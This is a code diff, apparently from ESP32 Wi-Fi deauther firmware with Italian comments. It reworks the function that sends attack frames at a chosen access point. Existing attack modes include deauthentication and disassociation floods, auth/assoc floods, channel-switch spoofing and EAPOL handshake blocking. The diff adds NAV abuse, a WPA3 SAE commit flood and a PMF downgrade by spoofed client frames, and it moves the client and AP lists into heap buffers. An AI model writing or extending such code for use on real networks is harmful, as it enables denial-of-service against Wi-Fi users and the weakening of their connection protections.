@@ -11,7 +11,7 @@
 
 #define DEAUTHER_TASK_PRIO 5
 // Syncronization times
-#define CHANNEL_SWITCH_DELAY 5   // Channel switch assestment time
+#define CHANNEL_SWITCH_DELAY 12   // Channel switch assestment time
 #define ATTACK_WINDOW        250  // RCO duration
 #define SOFTAP_REST_TIME     150   // Home channel time
 
@@ -44,13 +44,15 @@ static uint8_t get_csa_switch_channel(uint8_t current_channel) {
  */
 static void execute_attack_on_target(const uint8_t *ap_bssid, const char *ap_ssid, uint8_t ap_channel)
 {
-    const clients_t *clients = wifi_sniffer_get_clients();
+    clients_t *clients = malloc(sizeof(clients_t));
+    wifi_sniffer_get_clients(clients);
     bool clients_targeted = false;
 
     switch (current_attack_type) 
     {
         // --- ATTACCHI IBRIDI (Client Specifici -> Fallback Broadcast) ---
         case DEAUTHER_ATTACK_DEAUTH_FRAME:
+        {
             if (clients != NULL && clients->count > 0) {
                 for (int c = 0; c < clients->count; c++) {
                     if (memcmp(clients->client[c].bssid, ap_bssid, 6) == 0) {
@@ -63,8 +65,10 @@ static void execute_attack_on_target(const uint8_t *ap_bssid, const char *ap_ssi
                 wifi_attack_deauth_basic(NULL, ap_bssid, reason_code);
             }
             break;
+        }
 
         case DEAUTHER_ATTACK_DISASSOC_FRAME:
+        {
             if (clients != NULL && clients->count > 0) {
                 for (int c = 0; c < clients->count; c++) {
                     if (memcmp(clients->client[c].bssid, ap_bssid, 6) == 0) {
@@ -77,8 +81,10 @@ static void execute_attack_on_target(const uint8_t *ap_bssid, const char *ap_ssi
                 wifi_attack_send_disassoc(ap_bssid, broadcast_mac, reason_code);
             }
             break;
+        }
 
         case DEAUTHER_ATTACK_BROADCAST_FLOOD:
+        {
             if (clients != NULL && clients->count > 0) {
                 for (int c = 0; c < clients->count; c++) {
                     if (memcmp(clients->client[c].bssid, ap_bssid, 6) == 0) {
@@ -93,27 +99,50 @@ static void execute_attack_on_target(const uint8_t *ap_bssid, const char *ap_ssi
                 wifi_attack_send_disassoc(ap_bssid, broadcast_mac, reason_code);
             }
             break;
+        }
 
         // --- ATTACCHI BASATI SULL'AP ---
         case DEAUTHER_ATTACK_AUTH_FLOOD:
+        {
             wifi_attack_send_auth_frame(ap_bssid, random_mac);
             break;
+        }
 
         case DEAUTHER_ATTACK_ASSOC_FLOOD:
+        {
             wifi_attack_send_auth_frame(ap_bssid, random_mac);
             wifi_attack_send_assoc_req(ap_bssid, random_mac);
             break;
+        }
 
         case DEAUTHER_ATTACK_CSA_SPOOFING:
+        {
             uint8_t new_chanel = get_csa_switch_channel(ap_channel);
             wifi_attack_send_csa_beacon(ap_bssid, ap_bssid, new_chanel); 
             break;
+        }
 
         case DEAUTHER_ATTACK_BEACON_SPAM:
-                if (ap_ssid != NULL && strlen(ap_ssid) > 0) {
-                    wifi_attack_deauth_client_negative_tx_power(ap_bssid, ap_channel, ap_ssid);
-                }
-                break;
+        {
+            if (ap_ssid != NULL && strlen(ap_ssid) > 0) {
+                wifi_attack_deauth_client_negative_tx_power(ap_bssid, ap_channel, ap_ssid);
+            }
+            break;
+        }
+
+        case DEAUTHER_ATTACK_NAV_ABUSE:
+        {
+            // L'attacco NAV colpisce tutti sul canale, basta il BSSID
+            wifi_attack_nav_abuse(ap_bssid);
+            break;
+        }
+
+        case DEAUTHER_ATTACK_WPA3_SAE_FLOOD:
+        {
+            // Floodiamo l'AP con richieste SAE Commit
+            wifi_attack_wpa3_sae_flood(ap_bssid);
+            break;
+        }
 
         // --- ATTACCHI CLIENT-SPECIFIC ---
         case DEAUTHER_ATTACK_EAPOL_LOGOFF:
@@ -121,6 +150,7 @@ static void execute_attack_on_target(const uint8_t *ap_bssid, const char *ap_ssi
         case DEAUTHER_ATTACK_EAP_FAILURE:
         case DEAUTHER_ATTACK_EAP_ID_SPAM:
         case DEAUTHER_ATTACK_HANDSHAKE_BLOCK:
+        {
             if (clients != NULL && clients->count > 0) 
             {
                 for (uint8_t c = 0; c < clients->count; c++) 
@@ -145,11 +175,29 @@ static void execute_attack_on_target(const uint8_t *ap_bssid, const char *ap_ssi
                 }
             }
             break;
+        }
+
+        case DEAUTHER_ATTACK_PMF_DOWNGRADE:
+        {
+            if (clients != NULL && clients->count > 0) {
+                for (int c = 0; c < clients->count; c++) {
+                    if (memcmp(clients->client[c].bssid, ap_bssid, 6) == 0) {
+                        // Inviamo Disassoc (per staccarlo) seguito da Assoc Req legacy
+                        wifi_attack_send_disassoc(ap_bssid, clients->client[c].mac, reason_code);
+                        // Spoofiamo il client che chiede di connettersi senza PMF
+                        wifi_attack_send_assoc_req(ap_bssid, clients->client[c].mac);
+                    }
+                }
+            }
+            break;
+        }
 
         default:
             wifi_attack_deauth_basic(NULL, ap_bssid, reason_code);
             break;
     }
+
+    free(clients);
 }
 
 
@@ -165,9 +213,11 @@ static void deauther_send_frames(const target_info_t *target)
     // --- MODALITÀ BROADCAST (Smart Hopping) ---
     if (broadcast_target) 
     {
-        const aps_info_t *aps = wifi_sniffer_get_aps();
+        aps_info_t *aps = malloc(sizeof(aps_info_t));
+        wifi_sniffer_get_aps(aps);
         if (aps == NULL || aps->count == 0) {
-            vTaskDelay(pdMS_TO_TICKS(100)); 
+            vTaskDelay(pdMS_TO_TICKS(100));
+            free(aps);
             return;
         }
         uint8_t target_channels[MAX_AP];
@@ -209,6 +259,7 @@ static void deauther_send_frames(const target_info_t *target)
             }
             vTaskDelay(pdMS_TO_TICKS(SOFTAP_REST_TIME));
         }
+        free(aps);
     }
     // --- MODALITÀ SINGLE TARGET ---
     else 
